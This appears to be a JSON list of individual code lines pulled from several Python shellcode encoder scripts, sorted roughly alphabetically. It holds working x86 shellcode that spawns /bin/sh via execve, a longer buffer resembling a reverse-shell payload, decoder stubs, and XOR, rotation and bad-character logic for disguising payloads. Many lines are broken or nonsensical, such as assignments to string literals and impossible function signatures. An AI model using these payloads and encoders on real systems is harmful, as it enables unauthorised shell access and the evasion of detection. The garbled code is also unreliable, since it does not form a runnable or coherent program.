[
  "bad_chars = '\\x0a\\x00\\x0d'",
  "bad_chars = '\\\\x'[1:]",
  "break",
  "sys",
  "break",
  "break",
  "buf += b\"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\"",
  "buf += b\"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\"",
  "buf += b\"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\"",
  "buf += b\"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\"",
  "buf += b\"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\"",
  "buf += b\"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"",
  "buf += b\"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\"",
  "buf += b\"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\"",
  "buf += b\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\"",
  "buf += b\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\"",
  "buf += b\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\"",
  "buf += b\"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\"",
  "buf += b\"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\"",
  "buf += b\"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\"",
  "buf += b\"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\"",
  "buf += b\"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\"",
  "buf += b\"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"",
  "buf += b\"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\"",
  "buf += b\"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\"",
  "buf += b\"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\"",
  "buf += b\"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\"",
  "buf += b\"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\"",
  "buf += b\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\"",
  "buf += b\"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\"",
  "buf += b\"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\"",
  "buf = b ''",
  "byte =(y + ROT)%256",
  "byte = byte ^ 2",
  "byte = byte<<nbits",
  "chunk = shellcode[2:]",
  "chunk_no += 1",
  "chunk_no = 0",
  "count += 1",
  "count = 1",
  "a += 1",
  "counter = 0",
  "Dec_hopcode = int(hopcode, 16)",
  "var += '\\\\x'",
  "var0 = '%02x '%x",
  "surname = \"",
  "decoded2 += '%02x, '%x",
  "var += '0x'",
  "decoded2 = \"",
  "decoder_stub.append('\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff')",
  "decoder_stub = '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8' + decoder_stub",
  "decoder_stub.append('\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f')",
  "decoder_stub.append('\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66')",
  "'\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a' = decoder_stub",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub += '0x '",
  "decoder_stub = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'",
  "decoder_stub = \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"",
  "self.stdout.write(struct.style(' B ', xor_byte))",
  "return '%02x, '%(2, int(unicode)[0], '\\\\x')",
  "def find_valid_xor_byte(bytes, bad_chars):",
  "def mask(that, n):",
  "def rol(n, rotations & width, width, 8):",
  "def ror(n, rotations & width, width, 8):",
  "elif xxx == '0x0':",
  "else:",
  "else:",
  "encode += '%02x, '%x",
  "encode += 0",
  "encode += 0, 170",
  "encode = \"",
  "encoded += '\\\\x'",
  "encoded += '\\n '",
  "encoded += '0x '",
  "encoded += '\\\\x%02x '%170",
  "encoded += '%02x '%byte",
  "encoded += '\\\\x%02x '%random.randint(1, 100)",
  "encoded += '\\\\xbb'",
  "encoded += '\\\\xcc'",
  "encoded += '%02x '%(a & 255)",
  "encoded += '%02x '%(x & 255)",
  "encoded += '%02x '%(y & 0xff)",
  "encoded += '%02x '%int(value)",
  "encoded += '%02x '%x",
  "encoded += '%02x '%y",
  "encoded += '%02x '%y",
  "encoded += '%02x '%y",
  "a += '\\\\x%02x '%(256 \\x ', 16)",
  "encoded += '%02x '%x+7",
  "encoded = int(hex(leader)[2:], 16)",
  "encoded += insertByte[2:]",
  "encoded +=(2)[2:]",
  "encoded = \"",
  "encoded = '\\\\x'",
  "encoded = \"\"",
  "encoded = \"\"",
  "encoded = \"",
  "encoded = \"",
  "encoded = \" \\\\x%02x, ''%len(bytearray(shellcode))",
  "encoded = []",
  "encoded += end",
  "encoded_instruction_in_hex = '%02x '%rox_encoded_instruction",
  "encoded_nasm += '%02x, '%(z & 255)",
  "encoded_nasm += '0x '",
  "encoded_nasm = \"",
  "encoded_shellcode += '%02x, '%byte",
  "encoded_shellcode += '%02x, '%new",
  "encoded_shellcode += '%02x, '%z",
  "encoded_shellcode += '%02x, '%xor",
  "encoded_shellcode += '0x'",
  "encoded_shellcode += '0x '",
  "encoded_shellcode += '%02x '%(z & 255)",
  "encoded_shellcode = \"\"",
  "encoded_shellcode = \"",
  "shellcode.append(struct.pack(' B ', val1))",
  "shellcode.append(struct.pack(' B ', xor_byte))",
  "shellcode.append(struct.pack(' B ', xor_byte))",
  "shellcode.append(struct.pack(' B ', xor_byte))",
  "encoded1 += '0x '",
  "encoded1 += '%02x '%j",
  "encoded1 = \"",
  "encoded2 += '0x '",
  "encoded2 += '%02x, '%j",
  "encoded2 += '%02x, '%(y & 255)",
  "encoded2 += '%02x, '%x",
  "encoded2 += '%02x, '%x",
  "encoded2 += '%02x, '%y",
  "encoded2 += '%02x, '%x",
  "encoded2 += '%02x, '%(a & 255)",
  "encoded2 += '%02x, '%x+7",
  "encoded2 += '%02x, '%y",
  "encoded2.append('0x')",
  "encoded2 += '0x'",
  "encoded2 += '0x '",
  "encoded2 += '0x%02x, '%170",
  "encoded2 += '0x%02x, '%rand",
  "encoded2 += hex(leader)[2:]",
  "encoded2 += insertByte[2:]",
  "encoded2 += '0x '",
  "encoded2 = \"",
  "encoded2 = '0x'",
  "encoded2 = \"\"",
  "encoded2 = \"\"",
  "encoded2 = \"",
  "encoded2 = \"",
  "encoded2 = '0x%02x, '%len(bytearray(shellcode))",
  "encoded2P2 += '%02x, '%x",
  "encoded2P2.append('0x')",
  "encoded2P2 = \"\"",
  "encodedP2.append('\\\\x')",
  "encodedP2 += '%02x, '%x",
  "encodedP2 = \"\"",
  "end = \"\\\\xaa\"",
  "except:",
  "execve_shellcode = bytearray(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\")",
  "exec_shellcode = bytearray()",
  "execve_shellcode.append(0x90)",
  "sys.exit(1",
  "exit(1)",
  "exit(2)",
  "exit(3)",
  "fb = int(hex(leader)[2:], 16)",
  "lines[final_shellcode] + byte.encode('hex ')",
  "for bad_byte in bad_chars:",
  "for bytes in list(bad_chars):",
  "for byte in list([bytes]):",
  "for byte in decoder_stub:",
  "for bytes in decoder_stub:",
  "for bytes in encoder:",
  "for char in bad_chars:",
  "for z in bytearray(shellcode):",
  "for i in bytearray(shellcode):",
  "for over in execve_shellcode:",
  "for i in random.sample(1, 256):",
  "for i in range(0, 2):",
  "for i in range(0, len(shellcode_original), 4):",
  "for i in range(0, until):",
  "for x in bytearray(buf):",
  "for z in bytearray(shellcode):",
  "for x in shellcode(bytearray):",
  "for x in bytearray(shellcode):",
  "for z in bytearray(shellcode):",
  "for x in bytearray(shellcode):",
  "for x in bytearray(shellcode) [2:]:",
  "for z in bytearray(shellcode):",
  "'0x' = format_0x",
  "format_0x += encoded_instruction_in_hex + \",\"",
  "\"\" = \"\"",
  "format_slash_x = \"\"",
  "h =(y + rot)%256",
  "hopcode = '%02x '%x",
  "self.add(1)",
  "self.add(1)",
  "i = 0",
  "if \"0x0,\" in format_0x:",
  "if len(execve_shellcode)= 0:",
  "if(r ^ shellcode_original) [i]= 0:",
  "if == byte:",
  "if count%2 == 0:",
  "if counter%2 == 0:",
  "if i<len(chunk):",
  "if x == int(byte.encode('hex ')):",
  "if x == int(byte.encode('hex '), 32):",
  "if len(shellcode_original) is not divisable:",
  "if len(sys.argv) == 3:",
  "if len(sys.argv)<2:",
  "if len(sys.argv)<2:",
  "if len(sys.argv)<2:",
  "if len(xxx)>4:",
  "if matched_a_byte is True:",
  "if n>= 0:",
  "if matched_a_byte is not True:",
  "if padding:",
  "if rot<len(1):",
  "if not than<1:",
  "if struct.pack(\" B '', val1 ^ i) == bad_byte:",
  "if stub_has_bad_char is True:",
  "if total= 2:",
  "if x<128:",
  "if x<128:",
  "for x in bytearray(shellcode):",
  "if x>2:",
  "if x>2:",
  "if xor_byte == 0:",
  "import package.var0",
  "import random",
  "import random.randint()",
  "import random.randint()",
  "import package, socket",
  "import package.var0",
  "import sys",
  "import package.var0",
  "import sys",
  "insertByte = hex(random.randint(1, 255))",
  "j = i + magic%256",
  "leader = int(sys.argv[2])",
  "return len(bytearray(shellcode))",
  "length_format_0x = format_0x.count('\\n ')",
  "i = 13",
  "mask_value = mask(width)",
  "matched_a_byte = False",
  "matched_a_byte = True",
  "max_bits = 8",
  "n & mask = mask(width)",
  "n += 1",
  "n = 1",
  "n = bytearray(shellcode)",
  "nasm = nasm[1:]",
  "nasm = str(encoded).replace('\\\\ ', '/ ')",
  "nbits = int(sys.argv[1])",
  "new = ~i & 255",
  "new ^= xor ^ xor",
  "new = new<<shift",
  "offset = 1",
  "orig = []",
  "orig.append(i)",
  "original_shellcode += '%02x, '%x",
  "original_shellcode.append('0x')",
  "original_shellcode = \"\"",
  "overlapped = '\\033[35m'",
  "padding = 0",
  "padding = 4 - len(shellcode_original)%4",
  "r = random.randint(1, 255)",
  "rand = random.randint(1, 8)",
  "random.var0",
  "res1 =(x & val1)>>val2",
  "res1 = x<<val2",
  "res2 = x & val1",
  "res2 = res2 | val1",
  "res2 = res2>>max_bits - val2",
  "res2 = x<<max_bits - val2",
  "return(n<<width - rotations & bitwise)>>width - rotations",
  "return n.var0>>width - rotations & mask_value",
  "return 0",
  "return 2 * * n - 1",
  "return i",
  "return n",
  "return value",
  "rev_suplx = hex(suplX)",
  "rot = 8",
  "sys.argv = int(int(sys.argv[0]))",
  "rot = rotations%width",
  "rox_encoded_instruction = res1 | res2",
  "sb = int(hex(leader)[3:], 16)",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"\n  )",
  "def shellcode(tuple, \"1\u00c0Ph//shh/bin\u0089\u00e31\u00c9\u0089\u00caj\u000bX\u00cd\u0080\"):",
  "def shellcode(tuple, \"1\u00c0Ph//shh/bin\u0089\u00e3P\u0089\u00e2S\u0089\u00e1\u00b0\u000b\u00cd\u0080\"):",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  ,)",
  "return shellcode, \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "shellcode =(\n    \"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n  )",
  "return shellcode, \"\\x31\\xc0\\x50\\x89\\xe2\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\xb0\\x0b\\xcd\\x80\"",
  "shellcode = b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"",
  "shellcode = shellcode[2:]",
  "shellcode = '\\\\x'[1:]",
  "return shellcode, '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'",
  "shellcode_encoded = []",
  "shellcode_encoded_hex = \" ''.join(\" \\\\x {:02x } ''.format(x) for x in shellcode_encoded)",
  "shellcode_encoded_nasm = \".join('0x {:02x }, '.format(x) for x in shellcode_encoded).rstrip(',')",
  "shellcode_encoded.append(value)",
  "shellcode_encoded.append(value, 170)",
  "shellcode_encoded.append(r)",
  "shellcode_encoded.append(shellcode_original[i] ^ r)",
  "self.shellcode_original(shellcode_encoded[i+1] ^ r)",
  "self.shellcode_original(shellcode_encoded[i+2] ^ r)",
  "shellcode_encoded = shellcode_original[i + 3] ^ r",
  "shellcode_file = sys.argv[2]",
  "save.execve_shellcode = len(execve_shellcode)",
  "shellcode_original = bytearray.fromhex(f.read(), bytearray)",
  "shellcode_original_hex = \" ''.join(\" \\\\x {:02x } ''.format(x) for x in shellcode_original)",
  "shellcode_original.append(0x90)",
  "shift = int(int(sys.argv[0]))",
  "string1 = encoded + decoder_stub('%s-%s '%', '.join(encoded))",
  "stub_has_bad_char = False",
  "stub_has_bad_char = True",
  "subfs = fb - sb",
  "suplX = 255 - Dec_hopecode",
  "swapped = []",
  "swapped = len(execve_shellcode)",
  "swapped += + + execve_shellcode[x]",
  "swapped= ''? \", \".join(swapped [i: i+4] for i in range(0, len(swapped), 4))",
  "swapped = '0x ' + '0x'.join(a + b for a, b in zip(swapped[::2], swapped[1::2]))",
  "swapped = bytearray(bvar0)",
  "exit",
  "sys.exit(0)",
  "total = sys.argv[2:]",
  "try:",
  "val1 = max_bits - 1",
  "val1 = int(byte.encode('hex '), 32) ^ i",
  "val2 = int(chunk[i].encode('hex '), 32) ^ xor_byte",
  "val2 = max_bits",
  "W = '\\033[0m'",
  "while len(shellcode)>0:",
  "while x<shellcode_len:",
  "while 1 == False:",
  "shellcode_file = open(p, shellcode_file)",
  "x += 1",
  "x += 2",
  "x = x",
  "x = 0",
  "x = rol(x, rand)",
  "x = x<<1",
  "x = x ^ 170",
  "x = x ^ rand",
  "y = x - 0",
  "y = x - 0",
  "xor = int(int(sys.argv[1]))",
  "XOR = int(sys.argv[2])",
  "xor_byte = 0",
  "find_valid_xor_byte = chunk ^ bad_chars",
  "find_valid_xor_byte = find_valid_xor_byte(string1, bad_chars)",
  "xor_byte_good = value.False",
  "xor_byte_good = value.True",
  "XOR = '%02x '%XOR",
  "xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2], 16))",
  "y = bytearray(y) ^ int(shellcode[0])",
  "H = '\\033[33m'",
  "y = x",
  "bytearray(bytearray[:var2], int(shellcode[1]), bytearray(shellcode))",
  "y = x ^ 2",
  "y = int(y)",
  "y = x ^ 170",
  "y = bytearray(y)",
  "z = bitwise"
]